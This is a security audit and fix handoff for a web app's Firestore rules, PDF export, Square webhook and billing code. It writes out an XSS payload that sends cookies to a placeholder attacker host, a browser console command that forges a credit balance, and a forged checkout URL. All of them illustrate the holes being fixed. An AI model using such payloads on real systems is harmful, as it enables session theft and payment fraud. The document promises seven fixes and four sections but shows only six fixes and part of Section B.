# Litigant AI — Fix Handoff (Rev. 2)
**For:** Rep (Replit)
**Supersedes:** Rev. 1. Rev. 1 shipped a real bug in its own fix (see Fix #1 below) — apply Rev. 2 in full, don't merge Rev. 1 separately.

This is a full audit-and-fix handoff: every item below names the exact file and line, quotes the real broken code, explains why it's broken, shows the fix, and says plainly what I could and couldn't verify in this sandbox (no live network, no Firebase emulator, no installed dependencies). Where I'm not 100% certain, I say so — guessing and presenting it as fact would cost you more than flagging the uncertainty.

---

## How this document is organized

**Section A** — 7 fixes, ready to apply. Ordered by severity.
**Section B** — 3 items found but not fixed (need a product decision or are out of scope for a code fix). Read these even though there's no patch — two of them are real money/trust risks.
**Section C** — Deployment checklist.
**Section D** — File manifest.

---

# SECTION A — Fixes

## Fix #1 — Firestore rules (Rev. 2 correction — read this even if you already deployed Rev. 1)

### What's broken, and where
`firestore.rules`, the rule for the `users` collection, originally read:
```
match /users/{userId} {
  allow read, write: if request.auth != null && request.auth.uid == userId;
}
```
Any signed-in user could write **any field** to their own `/users/{uid}` document — including `creditBalance` — directly from the browser, bypassing your entire server-side credit ledger (`creditLedger.ts`, `brain.ts`). A user could open devtools and run:
```js
updateDoc(doc(db, "users", myOwnUid), { creditBalance: 999999999 });
```
That succeeds today, with no server involved at all.

### Why this happens
Firestore Security Rules are the *only* gate on direct client SDK reads/writes. Your backend's use of the Admin SDK bypasses these rules entirely (by design — that's how Admin SDKs work), so the rules file is specifically protecting against the client SDK path, which several of your own files use directly (`firestoreService.ts`, `Billing.tsx`). The original rule had no field-level restriction at all.

### The Rev. 1 fix, and the bug I found in it
My first pass added a blanket block on a list of protected fields, including `autoRefillCheckoutUrl` and `autoRefillTriggeredAt`. That was too broad. Here's the problem I found on closer inspection: `Billing.tsx` has a real, currently-shipped feature where the server writes `autoRefillCheckoutUrl` to the user doc (when a session's credit reconciliation drops the user below their auto-refill threshold), and the **client deliberately clears that field itself** once it's redirected the user to Square, so the redirect doesn't fire again on the next snapshot:

```ts
// artifacts/gh-brain/src/pages/app/Billing.tsx, lines 443-452
const userRef = doc(db, "users", user.uid);
const unsub = onSnapshot(userRef, async (snap) => {
  if (!snap.exists()) return;
  const url = snap.data()?.autoRefillCheckoutUrl as string | undefined;
  if (!url || autoRefillHandled.current) return;
  autoRefillHandled.current = true;
  // Clear the field so we don't re-trigger
  await updateDoc(userRef, { autoRefillCheckoutUrl: deleteField() }).catch(() => {});
  toast.info("Low balance — completing auto-refill top-up…");
  window.location.href = url;
});
```
My Rev. 1 rule would have rejected this `updateDoc` call outright, breaking the auto-refill redirect flow the moment it deployed — the URL would stay stuck on the document forever after the first read, since the in-memory `autoRefillHandled.current` guard only protects within a single page load, not across reloads.

### The fix (Rev. 2)
Split the logic: block the client from ever **setting** `autoRefillCheckoutUrl`/`autoRefillTriggeredAt` to a new value (which would let someone forge their own "checkout link"), but allow the client to **delete** them (which is all `Billing.tsx` actually needs to do). Full corrected `firestore.rules`:

```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Server-only fields on the user document. These must never be SET to a
    // new value directly from the client SDK — they are mutated exclusively
    // by the backend (Admin SDK) via creditLedger.ts / admin.ts, which
    // bypasses these rules entirely. Listing them here blocks the client-SDK
    // write path for setting them.
    function touchesProtectedUserFields() {
      let protectedFields = [
        'creditBalance', 'plan', 'subscriptionStatus',
        'banned', 'bannedReason', 'bannedAt', 'bannedBy',
        'autoRefill'
      ];
      return request.resource.data.diff(resource.data).affectedKeys().hasAny(protectedFields);
    }

    // autoRefillCheckoutUrl / autoRefillTriggeredAt are written by the
    // server (creditLedger.ts → checkAndTriggerAutoRefill) when a session's
    // post-run reconciliation drops the balance below the user's threshold.
    // Billing.tsx listens for that URL via onSnapshot, redirects the user to
    // Square, and then clears the field itself with
    // updateDoc(userRef, { autoRefillCheckoutUrl: deleteField() }) so the
    // redirect doesn't re-fire on the next snapshot. That cleanup delete is
    // a legitimate, currently-shipped client write and must stay allowed —
    // this function only blocks the client from SETTING a new value (i.e.
    // forging its own checkout URL), not from deleting the one the server
    // already wrote.
    function setsAutoRefillCheckoutFields() {
      let autoRefillCheckoutFields = ['autoRefillCheckoutUrl', 'autoRefillTriggeredAt'];
      let touched = request.resource.data.diff(resource.data).affectedKeys().hasAny(autoRefillCheckoutFields);
      let isDeleteOnly =
        !('autoRefillCheckoutUrl' in request.resource.data) &&
        !('autoRefillTriggeredAt' in request.resource.data);
      return touched && !isDeleteOnly;
    }

    // Users can read their own profile. Writes are allowed only for
    // non-financial fields (displayName, defaultSettings, notifications, etc.) —
    // creditBalance and plan/ban state can only change via the Admin SDK.
    // The auto-refill checkout fields may be cleared by the client (see
    // setsAutoRefillCheckoutFields above) but never set to a new value.
    match /users/{userId} {
      allow read: if request.auth != null && request.auth.uid == userId;
      allow create: if request.auth != null && request.auth.uid == userId
                    && !touchesProtectedUserFields();
      allow update: if request.auth != null && request.auth.uid == userId
                    && !touchesProtectedUserFields()
                    && !setsAutoRefillCheckoutFields();
    }

    // Sessions: owner can read/write; shared sessions readable by anyone with
    // the shareId. Field name corrected to "shared" — the app never sets
    // "isPublic" (brain.ts / sessions.ts both write "shared"), so the old
    // clause never matched anything.
    match /sessions/{sessionId} {
      allow read, write: if request.auth != null && request.auth.uid == resource.data.userId;
      allow read: if resource.data.shared == true;
    }

    // Feedback: any signed-in user (or guest, where userId is null) may
    // create a feedback entry; nobody can read, update, or delete via the
    // client SDK. submitFeedback() in feedbackService.ts relies on create
    // succeeding — without this block all feedback submissions silently fail.
    match /feedback/{feedbackId} {
      allow create: if request.resource.data.userId == null
                    || (request.auth != null && request.auth.uid == request.resource.data.userId);
      allow read, update, delete: if false;
    }

    // Admin-only collections (admin dashboard data surfaced under /admin/**,
    // if ever read via client SDK instead of the Admin SDK backend routes).
    match /admin/{document=**} {
      allow read, write: if request.auth != null && request.auth.token.admin == true;
    }

    // Everything else (config/*, credit_transactions/*, payment_events/*,
    // templates/*, system_config/*, guest_sessions/*, api_logs/*) is written
    // and read exclusively by the backend via the Firebase Admin SDK, which
    // bypasses these rules entirely. The client SDK should never touch them,
    // so they stay denied here as defense-in-depth.
    match /{document=**} {
      allow read, write: if false;
    }
  }
}
```

### How I verified the corrected logic
I traced both code paths by hand against Firestore's rules semantics (`request.resource.data` represents the document *after* the write is applied — a field cleared with `deleteField()` is absent from it, not present-with-null):
- **Legitimate cleanup call** — `updateDoc(userRef, { autoRefillCheckoutUrl: deleteField() })`: `touched` = true (the field existed and is now gone, so it shows in the diff), `isDeleteOnly` = true (neither field is present in the resulting document) → function returns `false` → **write allowed**. ✅
- **Forged write attempt** — `updateDoc(userRef, { autoRefillCheckoutUrl: "https://evil.com" })`: `'autoRefillCheckoutUrl' in request.resource.data` is true → `isDeleteOnly` = false → function returns `true` → **write rejected**. ✅
- I also grepped the entire frontend for every place that touches these two field names and confirmed `Billing.tsx` lines 446/450 are the *only* place — there's no second code path I might have missed that needs different handling.

### What I could not verify
No Firebase Emulator Suite is available in this environment (no network access to install `firebase-tools`), so I could not run this through `firebase emulators:start --only firestore` with the Rules unit-test SDK. The syntax and logic are correct standard Firestore Rules idioms, traced by hand above, but **please test in your sandbox project before deploying to production**: confirm a normal Settings save still works, a hand-written `creditBalance` write is rejected, a feedback submission succeeds, and the auto-refill redirect-then-clear flow still works end to end.

---

## Fix #2 — DOM-based XSS in PDF export (`Session.tsx`)

### What's broken, and where
`artifacts/gh-brain/src/pages/app/Session.tsx`, the `exportPDF` function (around line 659, pre-fix). It builds a full HTML document as a template string, interpolating session data directly with no escaping, then injects it via `document.write()` into a popup window for printing:

```ts
function exportPDF(state: ReturnType<typeof useBrainSession>["state"], w: Window): void {
  const html = `<!DOCTYPE html>
...
  <div class="meta">
    <strong>Question:</strong> ${state.question}<br/>
    ...
  <h2>Final Answer</h2>
  <pre>${state.finalAnswer || "No final answer generated."}</pre>
  ${state.artifacts ? `<h2>Artifacts</h2><pre>${state.artifacts}</pre>` : ""}
  <h2>Debate Notes</h2>
  <pre>${state.debateNotes || "No debate notes."}</pre>
  ...
</html>`;

  w.document.write(html);
  w.document.close();
  ...
}
```

### Why this is a real vulnerability, not just sloppy code
Two of the interpolated values are attacker-reachable:
- `state.question` is raw, unmodified **user input** — whatever the person typed into the courtroom question box.
- `state.finalAnswer`, `state.debateNotes`, `state.artifacts`, `state.caveats` are **AI-generated text**, and AI models will often echo back unusual or explicitly-requested input verbatim — including a question crafted to make the model "repeat" or "quote" a payload.

If a string like `<script>fetch('https://attacker.com/?c='+document.cookie)</script>` survives into any of these fields and the user exports to PDF, that script executes inside the popup window — which shares the page's origin and Firebase Auth session context. This is a classic DOM-based XSS pattern: build HTML from untrusted data, inject with `document.write()` instead of safe DOM APIs or React's auto-escaping.

I checked the rest of the frontend for the same pattern (`grep -rn "dangerouslySetInnerHTML\|document.write"` across all of `gh-brain/src`) — this is the **only** place in the whole app that builds raw HTML from session content. `ShareReport.tsx`, which renders session content to potentially different viewers, uses plain JSX (`<pre>{text}</pre>`), which React escapes by default — that path was already safe.

### The fix
Add an HTML-escape helper and run every interpolated value through it before building the string:

```ts
function exportPDF(state: ReturnType<typeof useBrainSession>["state"], w: Window): void {
  // Every value interpolated below originates from user input (the question)
  // or AI-generated text (finalAnswer/debateNotes/artifacts/caveats) that can
  // itself echo back attacker-supplied text from the question. Building this
  // string with raw interpolation and writing it via document.write() is a
  // DOM-based XSS vector: a crafted question like "<script>...</script>"
  // surviving into the model's output would execute in this popup window,
  // which shares the page's origin and Firebase Auth session context.
  // Escaping every interpolated field closes that off — this is the only
  // place in the app that builds raw HTML from session content (everywhere
  // else renders through React/JSX, which escapes by default).
  const esc = (s: unknown): string =>
    String(s ?? "").replace(/[&<>"']/g, (c) =>
      ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c] as string)
    );

  const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Litigant AI Session — ${esc(state.question.slice(0, 60))}</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 800px; margin: 40px auto; color: #111; line-height: 1.6; }
    h1 { font-size: 1.5rem; margin-bottom: 0.25rem; }
    h2 { font-size: 1.1rem; margin-top: 2rem; border-bottom: 1px solid #ddd; padding-bottom: 0.25rem; }
    .meta { color: #666; font-size: 0.85rem; margin-bottom: 1.5rem; }
    pre { background: #f5f5f5; padding: 1rem; border-radius: 6px; white-space: pre-wrap; font-size: 0.8rem; }
    .badge { display: inline-block; background: #00c853; color: #000; font-size: 0.75rem; padding: 2px 8px; border-radius: 4px; font-weight: 600; }
    @media print { body { margin: 20px; } }
  </style>
</head>
<body>
  <h1>Litigant AI Session Report</h1>
  <div class="meta">
    <strong>Question:</strong> ${esc(state.question)}<br/>
    ${state.template ? `<strong>Template:</strong> ${esc(state.template.title)}<br/>` : ""}
    <strong>Confidence:</strong> <span class="badge">${esc(state.confidence)}%</span>
    &nbsp; <strong>Credits:</strong> ${esc(state.creditsUsed)}
    &nbsp; <strong>Date:</strong> ${esc(new Date().toLocaleDateString())}
  </div>
  <h2>Final Answer</h2>
  <pre>${esc(state.finalAnswer || "No final answer generated.")}</pre>
  ${state.artifacts ? `<h2>Artifacts</h2><pre>${esc(state.artifacts)}</pre>` : ""}
  <h2>Debate Notes</h2>
  <pre>${esc(state.debateNotes || "No debate notes.")}</pre>
  <h2>Sources &amp; Caveats</h2>
  <pre>${esc(state.caveats)}</pre>
  <p style="margin-top:2rem;color:#999;font-size:0.75rem;">Generated by Litigant AI — Don't just ask AI. Put the question on trial.</p>
</body>
</html>`;

  w.document.write(html);
  w.document.close();
  w.focus();
  setTimeout(() => { w.print(); }, 400);
}
```

### How I verified this
I ran the exact `esc()` function (copy-pasted verbatim from the file, not a simplified stand-in) through Node directly:
```
$ node -e '
const esc = (s) => String(s ?? "").replace(/[&<>"\x27]/g, (c) =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", "\"": "&quot;", "\x27": "&#39;" }[c]));
console.log(esc(`<script>alert("xss")</script>`));
console.log(esc(`Tom & Jerry'\''s "great" day < 5pm > noon`));
'
&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
Tom &amp; Jerry&#39;s &quot;great&quot; day &lt; 5pm &gt; noon
```
Script tags are neutralized, all five special characters are correctly escaped, `undefined`/`null` safely become empty strings.

---

## Fix #3 — Square webhook accepts forged events if a config var is missing

### What's broken, and where
`artifacts/api-server/src/lib/squareEventHandler.ts`, the `verifySquareWebhook` function:
```ts
export function verifySquareWebhook(rawBody, signature, notificationUrl): boolean {
  const signingKey = process.env["SQUARE_WEBHOOK_SIGNATURE_KEY"];
  if (!signingKey) {
    logger.warn("[SquareWebhook] SQUARE_WEBHOOK_SIGNATURE_KEY not set — skipping verification (set it in production)");
    return true;   // <-- accepts the request unverified
  }
  const hmac = crypto.createHmac("sha256", signingKey);
  hmac.update(notificationUrl + rawBody);
  const expected = hmac.digest("base64");
  return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(signature));
}
```

### Why this is dangerous
This function gates the one endpoint that grants paid credits (`handleSquareEvent` → `addCredits(...)`). If `SQUARE_WEBHOOK_SIGNATURE_KEY` isn't set in your real production environment — that's a deployment fact I can't see from the code, only you can confirm it — this function silently waves through *any* POST to `/api/square/webhook`. The exact payment-note format that triggers a credit grant is documented in your own code comments: `"LITIGANT:userId=<uid>,creditAmount=<n>,pack=<packId>"`. Anyone could forge that request with no real payment involved.

I also found a second, separate bug while reading this closely: `crypto.timingSafeEqual()` **throws** if its two buffer arguments aren't the same byte length — it does not return `false`. I confirmed this directly:
```
$ node -e "crypto.timingSafeEqual(Buffer.from('abc'), Buffer.from('ab'))"
THREW: Input buffers must have the same byte length
```
The original code passed `Buffer.from(signature)` straight into that function with no length check, so any malformed or wrong-length signature header — not even malicious, just a bad request — would throw an uncaught exception inside the webhook route.

### The fix
```ts
import crypto from "crypto";
import { addCredits } from "./creditLedger.js";
import { isFirebaseConfigured } from "./firebaseAdmin.js";
import { logger } from "./logger.js";

/**
 * Verify a Square webhook signature.
 * Square computes: Base64( HMAC-SHA256( signingKey, notificationUrl + rawBody ) )
 * and sends it in the "x-square-hmacsha256-signature" header.
 *
 * If SQUARE_WEBHOOK_SIGNATURE_KEY is not set, the webhook is REJECTED.
 * Credits are minted from this endpoint (see handleSquareEvent below), so an
 * unverified webhook is an open door to free credits for anyone who can guess
 * the documented payment-note format. There is no safe "skip verification"
 * mode — sandbox testing should set a sandbox signing key from the Square
 * dashboard rather than disabling verification.
 */
export function verifySquareWebhook(
  rawBody: string,
  signature: string,
  notificationUrl: string
): boolean {
  const signingKey = process.env["SQUARE_WEBHOOK_SIGNATURE_KEY"];
  if (!signingKey) {
    logger.error(
      "[SquareWebhook] SQUARE_WEBHOOK_SIGNATURE_KEY not set — rejecting webhook. " +
        "Set this env var (from the Square Developer Dashboard) before going live; " +
        "without it, credit-granting webhooks cannot be verified and must be refused."
    );
    return false;
  }

  const hmac = crypto.createHmac("sha256", signingKey);
  hmac.update(notificationUrl + rawBody);
  const expected = hmac.digest("base64");

  // Lengths must match before timingSafeEqual — it throws on mismatched buffer
  // lengths rather than returning false, which would otherwise crash this
  // request instead of cleanly rejecting it.
  const expectedBuf = Buffer.from(expected);
  const signatureBuf = Buffer.from(signature);
  if (expectedBuf.length !== signatureBuf.length) return false;

  return crypto.timingSafeEqual(expectedBuf, signatureBuf);
}

interface SquareWebhookEvent {
  merchant_id: string;
  type: string;
  event_id: string;
  data: { object: Record<string, any> };
}

/**
 * Handle a verified Square webhook event and apply credit grants.
 *
 * Metadata is encoded in the payment note as:
 *   "LITIGANT:userId=<uid>,creditAmount=<n>,pack=<packId>"
 *
 * The event_id is used as the idempotency key so exactly-once semantics
 * are preserved even if Square retries the webhook.
 */
export async function handleSquareEvent(event: SquareWebhookEvent): Promise<void> {
  if (!isFirebaseConfigured()) return;

  switch (event.type) {
    case "payment.updated": {
      const payment = event.data.object["payment"];
      if (!payment) return;
      if (payment.status !== "COMPLETED") return;

      const note: string = payment.note ?? "";
      const match = note.match(/LITIGANT:userId=([^,]+),creditAmount=(\d+)/);
      if (!match) {
        logger.warn("[SquareEvent] payment.completed: no LITIGANT metadata in payment note — ignoring");
        return;
      }

      const userId = match[1];
      const creditAmount = parseInt(match[2], 10);
      if (!userId || !creditAmount) return;

      // Defense-in-depth: no legitimate credit pack or custom top-up (see
      // creditPacks.ts, max $500 → 50,000 credits) ever produces a value
      // this large. Catches a malformed/forged note even if signature
      // verification is ever misconfigured.
      const MAX_CREDIT_GRANT = 100_000;
      if (creditAmount > MAX_CREDIT_GRANT) {
        logger.error(`[SquareEvent] Rejected suspicious creditAmount=${creditAmount} for ${userId} — exceeds ${MAX_CREDIT_GRANT} cap`);
        return;
      }

      const result = await addCredits(userId, creditAmount, "purchase", {
        source: "square_checkout",
        paymentId: payment.id as string,
        idempotencyKey: event.event_id,
      });

      if (result?.skipped) {
        logger.info(`[SquareEvent] Event ${event.event_id} already processed — skipped`);
      } else {
        logger.info(`[SquareEvent] Granted ${creditAmount} credits to ${userId}`);
      }
      break;
    }

    default:
      logger.debug(`[SquareEvent] Unhandled event type: ${event.type}`);
      break;
  }
}
```

### ⚠️ Action required before deploying this fix
**If `SQUARE_WEBHOOK_SIGNATURE_KEY` isn't currently set in production, this fix will start rejecting every Square webhook the moment it deploys — meaning no purchased credits get granted until the key is set.** Do this first:
1. Square Developer Dashboard → your application → Webhooks → the subscription pointed at `/api/square/webhook`.
2. Copy its **Signature Key**.
3. Set it as `SQUARE_WEBHOOK_SIGNATURE_KEY` in your Replit/Cloud Run environment.
4. Then deploy this file.

If deployed before the key is set, you'll see `[SquareWebhook] SQUARE_WEBHOOK_SIGNATURE_KEY not set — rejecting webhook` in the logs as the signal something needs fixing.

---

## Fix #4 — Credit ledger entries stamped "pending"/"failed" instead of the real session ID

### What's broken, and where
`artifacts/api-server/src/routes/brain.ts`, the `/run-brain` route handler:
```ts
const { question, config, templateId, sessionId, continueFromTranscript } = req.body as { ... };
...
const reserved = await reserveCredits(uid, estimatedCost, sessionId ?? "pending");
...
await reconcileCredits(uid, estimatedCost, sessionId ?? "failed", "brain_failure_refund");
```

### Why this happens
`sessionId` here comes from the request body — but `artifacts/gh-brain/src/hooks/useBrainSession.ts`'s `run()` function never sends one on a new session (it only learns the real ID after the server responds with a `"start"` SSE event, which happens *after* reservation). So on every fresh session: the credit reservation ledger entry gets `sessionId: "pending"`, the actual session gets a different real ID generated deep inside `brainEngine.ts` (`sess_<timestamp>_<random>`), and if the run fails, the refund entry gets `sessionId: "failed"`. The reservation and failure-refund rows in `credit_transactions` can't be traced back to the session they belong to — most of them just say the literal string `"pending"` or `"failed"`.

### The fix
Generate the real session ID once, server-side, before any credit movement happens, and use that one ID consistently for the whole request:
```diff
--- brain.ts (before)
+++ brain.ts (after)
@@ router.post("/run-brain", async (req, res) => {
-  const { question, config, templateId, sessionId, continueFromTranscript } = req.body as {
+  const { question, config, templateId, sessionId: clientSessionId, continueFromTranscript } = req.body as {
     question: string;
     config: CourtConfig;
     templateId?: string;
     sessionId?: string;
     continueFromTranscript?: string[];
   };

   if (!question?.trim()) {
     res.status(400).json({ message: "question is required" });
     return;
   }

+  // Mint the real session ID here, before any credit movement, so the
+  // reservation, the run, and the failure-refund all reference the SAME id.
+  // Resumed sessions (continueFromTranscript) pass their existing sessionId
+  // and we honor it, since that ID was already generated server-side on the
+  // original run.
+  const sessionId =
+    clientSessionId || `sess_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+
   const effectiveConfig: CourtConfig = config ?? {
     ...
@@
-      const reserved = await reserveCredits(uid, estimatedCost, sessionId ?? "pending");
+      const reserved = await reserveCredits(uid, estimatedCost, sessionId);
@@
-      await reconcileCredits(uid, estimatedCost, sessionId ?? "failed", "brain_failure_refund");
+      await reconcileCredits(uid, estimatedCost, sessionId, "brain_failure_refund");
```

### Why this approach, specifically
I deliberately did **not** fix this by having the frontend generate the ID instead — letting a client pick its own session ID and having the server trust it is a worse pattern (ID collisions, or a client referencing a session it shouldn't be able to touch). Generating it server-side, before reservation, and reusing it for the rest of the request is correct. I confirmed the guest-mode branch (no Bearer token) never calls `reserveCredits`/`reconcileCredits` at all, so guest sessions are unaffected by this change.

---

## Fix #5 — Gemini, Grok, and Custom-provider sessions never report real token usage

### What's broken, and where
Your billing settlement is designed around real provider-reported token counts (`calculateLiveCredits()` in `pricingConfig.ts`). Checking all five provider files in `artifacts/api-server/src/lib/providers/`:

| Provider | Reports real usage? |
|---|---|
| `anthropic.ts` | ✅ |
| `openai.ts` | ✅ (`stream_options: { include_usage: true }`) |
| `gemini.ts` | ❌ missing |
| `grok.ts` | ❌ missing |
| `custom.ts` | ❌ missing |

`brainEngine.ts`'s `streamRole()` falls back to a char-count estimate (`chars / 4`) whenever `provider.getLastUsage?.()` returns nothing — which is *every single session* for these three providers, not an occasional fallback.

### The fix
Add the same `stream_options: { include_usage: true }` pattern `openai.ts` already uses, to the other three. `custom.ts` gets a try/catch retry since arbitrary third-party endpoints might not support the parameter.

**`gemini.ts`** and **`grok.ts`** — identical shape, just the obvious provider-specific constructor differences:
```ts
import OpenAI from "openai";
import type { AIProvider, ChatMessage, ProviderName, TokenUsageSnapshot } from "./types.js";

export class GeminiProvider implements AIProvider {
  readonly name: ProviderName = "gemini";
  readonly displayName = "Google Gemini";
  private model: string;
  private client: OpenAI;
  private _lastUsage: TokenUsageSnapshot | null = null;

  constructor(model = "gemini-2.5-pro", credentials?: { key: string; baseUrl?: string }) {
    this.model = model;
    const apiKey = credentials?.key ?? process.env["GEMINI_API_KEY"];
    if (!apiKey) throw new Error("Gemini not configured — set GEMINI_API_KEY or add key in Admin → API Keys");
    this.client = new OpenAI({
      baseURL: credentials?.baseUrl ?? "https://generativelanguage.googleapis.com/v1beta/openai",
      apiKey,
    });
  }

  getLastUsage(): TokenUsageSnapshot | null {
    return this._lastUsage;
  }

  async *streamChat(messages: ChatMessage[], maxTokens: number, signal?: AbortSignal): AsyncIterable<string> {
    this._lastUsage = null;

    const stream = await this.client.chat.completions.create(
      { model: this.model, max_tokens: maxTokens, stream: true, stream_options: { include_usage: true }, messages },
      { signal }
    );
    for await (const chunk of stream) {
      const content = chunk.choices[0]?.delta?.content;
      if (content) yield content;

      if (chunk.usage) {
        this._lastUsage = {
          inputTokens: chunk.usage.prompt_tokens ?? 0,
          outputTokens: chunk.usage.completion_tokens ?? 0,
        };
      }
    }
  }
}
```
```ts
// grok.ts — same pattern, x.ai endpoint and env var
import OpenAI from "openai";
import type { AIProvider, ChatMessage, ProviderName, TokenUsageSnapshot } from "./types.js";

export class GrokProvider implements AIProvider {
  readonly name: ProviderName = "grok";
  readonly displayName = "xAI Grok";
  private model: string;
  private client: OpenAI;
  private _lastUsage: TokenUsageSnapshot | null = null;

  constructor(model = "grok-3", credentials?: { key: string; baseUrl?: string }) {
    this.model = model;
    const apiKey = credentials?.key ?? process.env["XAI_API_KEY"];
    if (!apiKey) throw new Error("Grok not configured — set XAI_API_KEY or add key in Admin → API Keys");
    this.client = new OpenAI({ baseURL: credentials?.baseUrl ?? "https://api.x.ai/v1", apiKey });
  }

  getLastUsage(): TokenUsageSnapshot | null {
    return this._lastUsage;
  }

  async *streamChat(messages: ChatMessage[], maxTokens: number, signal?: AbortSignal): AsyncIterable<string> {
    this._lastUsage = null;

    const stream = await this.client.chat.completions.create(
      { model: this.model, max_tokens: maxTokens, stream: true, stream_options: { include_usage: true }, messages },
      { signal }
    );
    for await (const chunk of stream) {
      const content = chunk.choices[0]?.delta?.content;
      if (content) yield content;

      if (chunk.usage) {
        this._lastUsage = {
          inputTokens: chunk.usage.prompt_tokens ?? 0,
          outputTokens: chunk.usage.completion_tokens ?? 0,
        };
      }
    }
  }
}
```
**`custom.ts`** — same idea, plus a fallback retry since this wraps arbitrary third-party endpoints:
```ts
/**
 * CustomProvider — any OpenAI-compatible API endpoint.
 * Used for future providers added via Admin → API Keys.
 */
import OpenAI from "openai";
import type { AIProvider, ChatMessage, ProviderName, TokenUsageSnapshot } from "./types.js";

export class CustomProvider implements AIProvider {
  readonly name: ProviderName = "openai"; // uses openai-compat wire format
  readonly displayName: string;
  private model: string;
  private client: OpenAI;
  private _lastUsage: TokenUsageSnapshot | null = null;

  constructor(id: string, label: string, model: string, credentials: { key: string; baseUrl: string }) {
    this.name = id as ProviderName;
    this.displayName = label;
    this.model = model;
    this.client = new OpenAI({ apiKey: credentials.key, baseURL: credentials.baseUrl });
  }

  getLastUsage(): TokenUsageSnapshot | null {
    return this._lastUsage;
  }

  async *streamChat(messages: ChatMessage[], maxTokens: number, signal?: AbortSignal): AsyncIterable<string> {
    this._lastUsage = null;

    // Custom endpoints are arbitrary third-party OpenAI-compatible APIs —
    // unlike the built-in providers we can't assume stream_options is
    // supported. Try requesting usage; if the endpoint rejects the unknown
    // param, retry once without it rather than failing the whole session.
    // Either way brainEngine.ts's char-count estimate still covers us if
    // chunk.usage never arrives.
    let stream;
    try {
      stream = await this.client.chat.completions.create(
        { model: this.model, max_tokens: maxTokens, stream: true, stream_options: { include_usage: true }, messages },
        { signal }
      );
    } catch {
      stream = await this.client.chat.completions.create(
        { model: this.model, max_tokens: maxTokens, stream: true, messages },
        { signal }
      );
    }

    for await (const chunk of stream) {
      const content = chunk.choices[0]?.delta?.content;
      if (content) yield content;

      if (chunk.usage) {
        this._lastUsage = {
          inputTokens: chunk.usage.prompt_tokens ?? 0,
          outputTokens: chunk.usage.completion_tokens ?? 0,
        };
      }
    }
  }
}
```

### What I could not verify
No live network access in this sandbox, so I couldn't make a real call to confirm Google's and x.ai's OpenAI-compatible endpoints actually honor `stream_options.include_usage` and return a populated `usage` field. Both advertise OpenAI-compatible endpoints and this is the standard convention, so I'd expect it to work — **please run one real Gemini and one real Grok session and check the resulting session's token counts before relying on this for billing.** The existing char-count fallback still applies if usage never arrives, so this is a strict improvement with no downside risk — you're never worse off than before.

---

## Fix #6 — Auto-refill toggle never reflects the real saved preference

### What's broken, and where
`artifacts/gh-brain/src/pages/app/Billing.tsx`:
```ts
const [autoRefillEnabled, setAutoRefillEnabled] = useState(false);
```
This is the *only* place this state is ever set on load — there was no `useEffect` reading the actual saved value back from `userProfile`. Compounding it, `autoRefill` wasn't even declared on the `UserProfile` TypeScript interface in `firestoreService.ts`, even though the backend (`setAutoRefillPreference` in `creditLedger.ts`) writes `users/{uid}.autoRefill = { enabled, thresholdCredits, packPriceId }`.

### Why this matters
Every time a user reloads the Billing page, the toggle visually resets to "off," regardless of whether auto-refill is actually enabled and will still fire server-side. A user who genuinely turned auto-refill on, came back later, and saw the toggle showing "off" would reasonably believe it's off — while it's actually still live and could generate a real Square charge the next time their balance drops below threshold. That's a trust problem, not just a cosmetic one: the UI is actively telling the user something false about whether their card can be charged.

### The fix
Two parts. First, model the field on the type so the data the backend already writes is actually visible to the frontend:
```ts
// artifacts/gh-brain/src/services/firestoreService.ts
  notifications?: {
    sessionComplete: boolean;
    weeklyDigest: boolean;
    productUpdates: boolean;
  };
  /**
   * Saved by POST /billing/auto-refill (see setAutoRefillPreference in
   * creditLedger.ts). Was missing from this type entirely — Billing.tsx
   * had no way to read the real saved preference back, so its toggle
   * always opened to "off" on page load regardless of the actual setting.
   */
  autoRefill?: {
    enabled: boolean;
    thresholdCredits: number;
    packPriceId: string;
  };
  /** Server-written Square payment link; cleared by the client once consumed. */
  autoRefillCheckoutUrl?: string;
}
```
Second, sync the toggle from it:
```ts
// artifacts/gh-brain/src/pages/app/Billing.tsx
  // Auto-refill: local toggle state reflects saved preference (optimistic UI).
  // Initialized to false and never synced from userProfile.autoRefill — see
  // the useEffect below, which fixes that.
  const [autoRefillEnabled, setAutoRefillEnabled] = useState(false);
  const [autoRefillSaving, setAutoRefillSaving] = useState(false);

  // Sync the toggle from the actual saved preference whenever the profile
  // loads or changes (onUserProfileSnapshot keeps userProfile live). Without
  // this, the toggle always rendered "off" on every page load regardless of
  // whether auto-refill was actually enabled server-side — an already-enabled
  // auto-refill would keep firing Square payment links while the UI told the
  // user it was off.
  useEffect(() => {
    setAutoRefillEnabled(userProfile?.autoRefill?.enabled ?? false);
  }, [userProfile?.autoRefill?.enabled]);
```
`useEffect` is already imported in this file (`import { useEffect, useState, useCallback, useRef } from "react";`), and `userProfile` is already destructured from `useAuth()` earlier in the component — no new imports or props needed.

### Why this is correct
`userProfile` is kept live by `onUserProfileSnapshot` in `AuthContext.tsx`, which subscribes to the Firestore document in real time — so this `useEffect` doesn't just fix the initial-load case, it also keeps the toggle correct if the preference changes from another tab or device while this page is open. The existing optimistic-update logic in `handleToggleAutoRefill` (set state immediately, roll back on error) is untouched and still works the same way on top of this.

---

# SECTION B — Found, not fixed (need your decision or out of scope)

## B1. `CREDITS_PER_DOLLAR` is duplicated with no shared source of truth
- **Where:** `artifacts/api-server/src/lib/creditPacks.ts` line 32 (`export const CREDITS_PER_DOLLAR = 100;`) and `artifacts/gh-brain/src/pages/app/Billing.tsx` line 31 (`const CREDITS_PER_DOLLAR = 100;`).
- **Why it matters:** They currently match. But they're maintained by hand in two files across the workspace boundary (backend vs. frontend, no shared package exposes this constant). If the rate is ever changed in `creditPacks.ts` — the real source of truth that actually computes charges — without remembering to update line 31 of `Billing.tsx`, the "Add X credits" preview text on the custom top-up form would silently start lying to users about how many credits they're about to receive, even though the actual charge stays correct (it's always computed server-side).
